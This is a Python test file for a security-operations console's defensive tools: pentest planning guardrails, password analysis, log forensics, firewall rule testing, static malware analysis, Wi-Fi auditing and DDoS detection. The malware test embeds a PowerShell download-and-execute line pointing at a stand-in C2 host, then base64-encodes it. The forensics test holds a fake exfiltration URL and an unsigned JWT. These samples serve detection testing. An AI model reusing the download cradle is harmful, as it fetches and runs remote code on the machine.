"""Testes das 7 ferramentas defensivas do Console SOC e guardrails éticos."""

from __future__ import annotations

import base64
import json
from types import SimpleNamespace

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import select
from sqlalchemy.orm import Session
from test_ssh_audits import authorize_lab, create_lab_asset, register

from app.models.entities import (
    Asset,
    AuditLog,
    FindingRecord,
    Scan,
    ScanCheckResultRecord,
)


def test_pentest_assistant_manual_production_guardrail_and_asset_isolation(
    client: TestClient,
    db_session: Session,
) -> None:
    # 1. Modo manual em PRODUCTION bloqueia passos invasivos
    prod_resp = client.post(
        "/api/v1/security-tools/pentest-assistant/plan",
        json={
            "asset_type": "WEB_APP",
            "environment": "PRODUCTION",
            "target_label": "Portal Corporativo",
        },
    )
    assert prod_resp.status_code == 200, prod_resp.text
    prod_data = prod_resp.json()
    assert prod_data["authorization_status"] == "MANUAL_UNVERIFIED"
    all_steps = [step for phase in prod_data["phases"] for step in phase["steps"]]
    pt09 = next(s for s in all_steps if s["step_id"] == "PT-09")
    assert pt09["automated_status"] == "BLOCKED_IN_PRODUCTION"
    assert "PRODUCTION" in (prod_data["authorization_warning"] or "")

    # 2. asset_id sem autenticação retorna 401
    owner_headers = register(client, "pt-owner@lab.local")
    outsider_headers = register(client, "pt-outsider@lab.local")
    asset_url = create_lab_asset(client, owner_headers, hostname="lab-target")
    asset_id = asset_url.rsplit("/", 1)[-1]
    authorize_lab(client, owner_headers, asset_url)

    client.cookies.clear()
    unauth_resp = client.post(
        "/api/v1/security-tools/pentest-assistant/plan",
        json={"asset_id": asset_id},
    )
    assert unauth_resp.status_code == 401

    # 3. Outro tenant recebe 404 (isolamento multi-organização)
    outsider_resp = client.post(
        "/api/v1/security-tools/pentest-assistant/plan",
        headers=outsider_headers,
        json={"asset_id": asset_id},
    )
    assert outsider_resp.status_code == 404

    # 4. Ativo com scan concluído e achado aberto correlaciona checks reais
    asset = db_session.get(Asset, asset_id)
    assert asset is not None
    scan = Scan(
        organization_id=asset.organization_id,
        asset_id=asset.id,
        profile_type="QUICK",
        status="COMPLETED",
        enabled_modules=["mod_a_recon_headers_tls"],
        total_checks_run=2,
        findings_summary={"CRITICAL": 0, "HIGH": 1, "MEDIUM": 0, "LOW": 0, "INFO": 0},
    )
    db_session.add(scan)
    db_session.flush()
    db_session.add(
        ScanCheckResultRecord(
            scan_id=scan.id,
            module_id="mod_a_recon_headers_tls",
            check_id="CHK-A01",
            title="HTTPS",
            status="PASSED",
            duration_ms=10,
            summary="OK",
            details={},
        )
    )
    db_session.add(
        FindingRecord(
            organization_id=asset.organization_id,
            asset_id=asset.id,
            scan_id=scan.id,
            fingerprint="fp-pt-a02",
            module_id="mod_a_recon_headers_tls",
            check_id="CHK-A02",
            title="HSTS Ausente",
            description="Cabeçalho ausente",
            category="Headers",
            result_classification="VULNERABILITY",
            severity="HIGH",
            confidence="CERTAIN",
            cwe_ids=["CWE-319"],
            owasp_categories=["A05:2021"],
            affected_endpoint="http://lab-target/",
            evidence={},
            impact="Downgrade",
            reproduction_steps=["GET /"],
            remediation_data={},
            treatment_status="OPEN",
        )
    )
    db_session.commit()

    owner_resp = client.post(
        "/api/v1/security-tools/pentest-assistant/plan",
        headers=owner_headers,
        json={"asset_id": asset_id},
    )
    assert owner_resp.status_code == 200, owner_resp.text
    owner_data = owner_resp.json()
    assert owner_data["authorization_status"] == "VERIFIED"
    assert owner_data["open_findings_count"] >= 1
    steps_by_id = {s["step_id"]: s for p in owner_data["phases"] for s in p["steps"]}
    assert steps_by_id["PT-04"]["automated_status"] == "COVERED_PASSED"
    assert steps_by_id["PT-05"]["automated_status"] == "COVERED_WITH_FINDINGS"


def test_password_tools_generate_analyze_and_never_persist_secret(
    client: TestClient,
    db_session: Session,
) -> None:
    headers = register(client, "pwd-sec@lab.local")

    # Geração aleatória e passphrase
    gen_resp = client.post(
        "/api/v1/security-tools/password/generate",
        headers=headers,
        json={"mode": "RANDOM", "length": 24, "exclude_ambiguous": True},
    )
    assert gen_resp.status_code == 200, gen_resp.text
    gen_data = gen_resp.json()
    assert gen_data["length"] == 24
    assert gen_data["entropy_bits"] > 100
    assert not any(ch in gen_data["generated"] for ch in "0Oo1lI|")

    phrase_resp = client.post(
        "/api/v1/security-tools/password/generate",
        headers=headers,
        json={"mode": "PASSPHRASE", "word_count": 5, "separator": "-"},
    )
    assert phrase_resp.status_code == 200, phrase_resp.text
    assert phrase_resp.json()["generated"].count("-") == 4

    # Análise de senha fraca vs forte
    weak_secret = "admin123"
    weak_resp = client.post(
        "/api/v1/security-tools/password/analyze",
        headers=headers,
        json={"password": weak_secret},
    )
    assert weak_resp.status_code == 200
    weak_data = weak_resp.json()
    assert weak_data["classification"] == "CRITICAL_WEAK"
    assert weak_data["score"] < 25
    assert weak_data["detected_patterns"]

    strong_secret = "V!r9#kL2$mQp8@Zx4&Ty7"
    strong_resp = client.post(
        "/api/v1/security-tools/password/analyze",
        headers=headers,
        json={"password": strong_secret},
    )
    assert strong_resp.status_code == 200
    strong_data = strong_resp.json()
    assert strong_data["score"] >= 75
    assert all(chk["passed"] for chk in strong_data["compliance_checks"])

    # Garantir que nenhuma senha foi gravada em AuditLog
    logs = db_session.scalars(select(AuditLog)).all()
    serialized = json.dumps([log.metadata_json for log in logs])
    assert weak_secret not in serialized
    assert strong_secret not in serialized
    assert gen_data["generated"] not in serialized


def test_forensics_hashes_defanged_iocs_jwt_and_secret_warnings(
    client: TestClient,
) -> None:
    jwt_header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip("=")
    jwt_payload = base64.urlsafe_b64encode(
        b'{"sub":"lab-user","secret":"topsecret123","exp":1700000000}'
    ).decode().rstrip("=")
    sample = (
        "2026-11-20T18:10:02Z GET 198.51.100.45 -> 10.0.0.12 "
        '"GET /api/v1/login HTTP/1.1" 401 312 '
        "https://evil-lab.example.invalid/drop?token=abc123 "
        "CVE-2024-3094 "
        f"Authorization: Bearer {jwt_header}.{jwt_payload}."
    )
    resp = client.post(
        "/api/v1/security-tools/forensics/analyze",
        json={"content": sample, "artifact_name": "proxy.log", "defang_iocs": True},
    )
    assert resp.status_code == 200, resp.text
    data = resp.json()
    assert len(data["hashes"]["sha256"]) == 64
    assert "198[.]51[.]100[.]45" in data["iocs"]["ipv4_public"]
    assert "10[.]0[.]0[.]12" in data["iocs"]["ipv4_private"]
    assert any(u.startswith("hxxps://") and "token=%5BREDACTED%5D" in u or "REDACTED" in u for u in data["iocs"]["urls"])
    assert "CVE-2024-3094" in data["iocs"]["cves"]
    assert data["timeline"]["events_detected"] == 1
    assert data["timeline"]["http_status_counts"]["401"] == 1
    assert data["jwt_inspection"]["detected"] is True
    assert data["jwt_inspection"]["payload_sanitized"]["secret"] == "[REDACTED]"
    assert any("none" in w.lower() for w in data["jwt_inspection"]["warnings"])
    assert len(data["secret_leak_warnings"]) >= 2


def test_firewall_tester_detects_exposed_ports_shadowing_and_simulates_packet(
    client: TestClient,
) -> None:
    rules = (
        "iptables -P INPUT DROP\n"
        "iptables -A INPUT -p tcp -s 0.0.0.0/0 --dport 5432 -j ACCEPT\n"
        "iptables -A INPUT -p tcp -s 10.0.0.0/8 --dport 22 -j ACCEPT\n"
        "iptables -A INPUT -p tcp -s 10.20.0.0/16 --dport 22 -j DENY"
    )
    resp = client.post(
        "/api/v1/security-tools/firewall/test",
        json={
            "rules_text": rules,
            "test_packet": {"protocol": "TCP", "source_ip": "10.20.1.5", "destination_port": 22},
        },
    )
    assert resp.status_code == 200, resp.text
    data = resp.json()
    assert data["has_default_deny"] is True
    assert data["total_rules_parsed"] == 3
    titles = [f["title"] for f in data["findings"]]
    assert any("banco de dados exposto" in t.lower() for t in titles)
    assert any("sombreada" in t.lower() for t in titles)
    # A regra ampla na linha 3 libera antes da linha 4 -> ALLOW
    assert data["simulation"]["verdict"] == "ALLOW"
    assert data["simulation"]["matched_line"] == 3

    # Pacote não liberado cai na política Default-Deny sem ser sombreado por -P INPUT DROP
    drop_resp = client.post(
        "/api/v1/security-tools/firewall/test",
        json={
            "rules_text": rules,
            "test_packet": {"protocol": "TCP", "source_ip": "198.51.100.5", "destination_port": 3389},
        },
    )
    assert drop_resp.status_code == 200
    assert drop_resp.json()["simulation"]["verdict"] == "DENY"


def test_malware_static_analysis_deobfuscates_powershell_and_cleans_benign(
    client: TestClient,
) -> None:
    ps_script = "IEX (New-Object Net.WebClient).DownloadString('http://lab-c2.invalid/stage')"
    encoded = base64.b64encode(ps_script.encode("utf-16-le")).decode("ascii")
    payload = f"powershell.exe -NoP -EncodedCommand {encoded}"

    mal_resp = client.post(
        "/api/v1/security-tools/malware/analyze",
        json={"payload": payload, "filename": "dropper.ps1", "input_encoding": "TEXT"},
    )
    assert mal_resp.status_code == 200, mal_resp.text
    mal_data = mal_resp.json()
    assert mal_data["verdict"] == "HIGH_RISK_MALICIOUS_INDICATORS"
    rule_ids = {h["rule_id"] for h in mal_data["signature_hits"]}
    assert {"MAL-001", "MAL-002"}.issubset(rule_ids)
    assert any("PowerShell UTF-16LE" in d["encoding"] for d in mal_data["deobfuscated_previews"])

    clean_resp = client.post(
        "/api/v1/security-tools/malware/analyze",
        json={"payload": "print('hello defensive world')\n", "filename": "safe.py"},
    )
    assert clean_resp.status_code == 200
    assert clean_resp.json()["verdict"] == "CLEAN_NO_INDICATORS"


def test_wifi_auditor_parses_netsh_and_flags_open_wep_and_evil_twin(
    client: TestClient,
) -> None:
    netsh_sample = """SSID 1 : Corp-Lab
    Autenticação            : WPA3-Personal
    Criptografia            : CCMP
    BSSID 1                 : 02:11:22:33:44:55
         Sinal              : 85%
         Canal              : 6
SSID 2 : Corp-Lab
    Autenticação            : Aberta
    Criptografia            : Nenhuma
    BSSID 1                 : 02:99:88:77:66:55
         Sinal              : 90%
         Canal              : 3
SSID 3 : Legado-Lab
    Autenticação            : WEP
    Criptografia            : WEP
    BSSID 1                 : 02:aa:bb:cc:dd:ee
         Sinal              : 70%
         Canal              : 11"""

    resp = client.post(
        "/api/v1/security-tools/wifi/audit",
        json={"raw_scan_output": netsh_sample},
    )
    assert resp.status_code == 200, resp.text
    data = resp.json()
    assert data["total_networks"] == 3
    assert data["evil_twin_suspected"] is True
    titles = [f["title"] for f in data["findings"]]
    assert any("aberta" in t.lower() for t in titles)
    assert any("wep" in t.lower() for t in titles)
    assert any("evil twin" in t.lower() for t in titles)

    empty_resp = client.post(
        "/api/v1/security-tools/wifi/audit",
        json={"raw_scan_output": "", "networks": []},
    )
    assert empty_resp.status_code == 422


def test_ddos_analyzer_detects_burst_saturation_and_enforces_asset_isolation(
    client: TestClient,
    db_session: Session,
) -> None:
    owner_headers = register(client, "ddos-owner@lab.local")
    outsider_headers = register(client, "ddos-outsider@lab.local")
    asset_url = create_lab_asset(client, owner_headers, hostname="lab-target")
    asset_id = asset_url.rsplit("/", 1)[-1]

    # Semente de achado Módulo F no ativo do proprietário
    asset = db_session.get(Asset, asset_id)
    assert asset is not None
    scan = Scan(
        organization_id=asset.organization_id,
        asset_id=asset.id,
        profile_type="QUICK",
        status="COMPLETED",
        enabled_modules=["mod_f_dos_resilience_posture"],
        total_checks_run=1,
        findings_summary={"CRITICAL": 0, "HIGH": 0, "MEDIUM": 1, "LOW": 0, "INFO": 0},
    )
    db_session.add(scan)
    db_session.flush()
    db_session.add(
        FindingRecord(
            organization_id=asset.organization_id,
            asset_id=asset.id,
            scan_id=scan.id,
            fingerprint="fp-ddos-f02",
            module_id="mod_f_dos_resilience_posture",
            check_id="CHK-F02",
            title="Ausência de cabeçalhos de Rate Limiting",
            description="Sem cabeçalhos RateLimit-*",
            category="DoS Posture",
            result_classification="VULNERABILITY",
            severity="MEDIUM",
            confidence="FIRM",
            cwe_ids=["CWE-770"],
            owasp_categories=["API4:2023"],
            affected_endpoint="http://lab-target/api",
            evidence={},
            impact="Saturação",
            reproduction_steps=["GET /api"],
            remediation_data={},
            treatment_status="OPEN",
        )
    )
    db_session.commit()

    burst_logs = "\n".join(
        [
            f'198.51.100.88 - - [20/Nov/2026:20:00:01 +0000] "GET /api/v1/search?q={i} HTTP/1.1" 503 128 "-" "python-requests/2.31"'
            for i in range(15)
        ]
        + [
            '203.0.113.5 - - [20/Nov/2026:20:00:02 +0000] "GET /health HTTP/1.1" 200 32 "-" "Mozilla/5.0"'
        ]
    )

    # Isolamento multi-tenant
    assert (
        client.post(
            "/api/v1/security-tools/ddos/analyze",
            headers=outsider_headers,
            json={"access_logs": burst_logs, "asset_id": asset_id},
        ).status_code
        == 404
    )

    resp = client.post(
        "/api/v1/security-tools/ddos/analyze",
        headers=owner_headers,
        json={
            "access_logs": burst_logs,
            "asset_id": asset_id,
            "posture": {"has_cdn_waf": False, "has_rate_limiting": False},
        },
    )
    assert resp.status_code == 200, resp.text
    data = resp.json()
    assert data["total_requests_parsed"] == 16
    assert data["risk_level"] == "CRITICAL"
    anomaly_types = {a["anomaly_type"] for a in data["anomalies"]}
    assert {"SINGLE_IP_CONCENTRATION", "ORIGIN_SATURATION", "L7_CACHE_BUSTING"}.issubset(
        anomaly_types
    )
    assert any("CHK-F02" in ctx for ctx in data["asset_module_f_context"])
    assert len(data["mitigation_snippets"]) >= 3


def test_wifi_auditor_real_netsh_dualband_hidden_abrir_and_scan_local(
    client: TestClient,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    real_netsh = """
Nome da interface: Wi-Fi
Há 3 redes visíveis no momento.

SSID 1 : Lab-DualBand
    Tipo de rede            : Infraestrutura
    Autenticação            : WPA2-Personal
    Criptografia            : CCMP
    BSSID 1                 : b4:c0:c3:01:d0:c0
         Sinal             : 90%
         Tipo de rádio         : 802.11ax
         Canal            : 44
    BSSID 2                 : b4:c0:c3:01:d0:be
         Sinal             : 98%
         Tipo de rádio         : 802.11ax
         Canal            : 6

SSID 2 :
    Tipo de rede            : Infraestrutura
    Autenticação            : WPA2-Personal
    Criptografia            : CCMP
    BSSID 1                 : ca:eb:ff:f6:c0:bc
         Sinal             : 12%
         Tipo de rádio         : 802.11ax
         Canal            : 149

SSID 3 : Hotspot-Aberto
    Tipo de rede            : Infraestrutura
    Autenticação            : Abrir
    Criptografia            : Nenhum
    BSSID 1                 : da:31:39:2e:78:a8
         Sinal             : 45%
         Tipo de rádio         : 802.11n
         Canal            : 11
"""
    real_iface = """
    Nome                   : Wi-Fi
    Descrição            : Realtek 8822CE Wireless LAN 802.11ac PCI-E NIC
    Estado                  : Conectado
    SSID                   : Lab-DualBand
    BSSID                  : b4:c0:c3:01:d0:c0
    Tipo de rádio             : 802.11ac
    Autenticação         : WPA2-Personal
    Codificação                 : CCMP
    Canal                : 44
    Taxa de recepção (Mbps)    : 390
    Taxa de transmissão (Mbps)   : 390
    Sinal                 : 96%
"""

    audit_resp = client.post(
        "/api/v1/security-tools/wifi/audit",
        json={"raw_scan_output": real_netsh, "connected_interface_output": real_iface},
    )
    assert audit_resp.status_code == 200, audit_resp.text
    audit_data = audit_resp.json()
    assert audit_data["total_networks"] == 4
    # Dual-band com mesma autenticação/cifra não gera falso positivo Evil Twin
    assert audit_data["evil_twin_suspected"] is False
    assert audit_data["connected_interface"]["ssid"] == "Lab-DualBand"
    assert audit_data["connected_interface"]["channel"] == 44
    bands = {a["channel"]: a["band"] for a in audit_data["assessments"]}
    assert bands[44] == "5 GHz"
    assert bands[6] == "2.4 GHz"
    assert any(
        a["ssid"] == "Hotspot-Aberto" and a["security_grade"] == "F"
        for a in audit_data["assessments"]
    )
    assert any("oculto" in f["title"].lower() for f in audit_data["findings"])

    # Teste de /wifi/scan-local simulando Windows netsh disponível
    monkeypatch.setattr("app.services.security_tools_service.platform.system", lambda: "Windows")
    monkeypatch.setattr(
        "app.services.security_tools_service.shutil.which",
        lambda name: "C:\\Windows\\System32\\netsh.exe" if name == "netsh" else None,
    )

    def _fake_run(cmd: list[str], **_kwargs: object) -> SimpleNamespace:
        if "interfaces" in cmd:
            return SimpleNamespace(returncode=0, stdout=real_iface.encode("utf-8"), stderr=b"")
        return SimpleNamespace(returncode=0, stdout=real_netsh.encode("utf-8"), stderr=b"")

    monkeypatch.setattr("app.services.security_tools_service.subprocess.run", _fake_run)
    local_resp = client.post("/api/v1/security-tools/wifi/scan-local")
    assert local_resp.status_code == 200, local_resp.text
    local_data = local_resp.json()
    assert local_data["available"] is True
    assert local_data["source"] == "HOST_NETSH"
    assert local_data["audit"]["total_networks"] == 4

    # Fallback gracioso quando em container sem adaptador Wi-Fi
    monkeypatch.setattr("app.services.security_tools_service.platform.system", lambda: "Linux")
    monkeypatch.setattr("app.services.security_tools_service.shutil.which", lambda _name: None)
    container_resp = client.post("/api/v1/security-tools/wifi/scan-local")
    assert container_resp.status_code == 200, container_resp.text
    assert container_resp.json()["available"] is False
    assert container_resp.json()["source"] == "CONTAINER_NO_WIFI_RADIO"
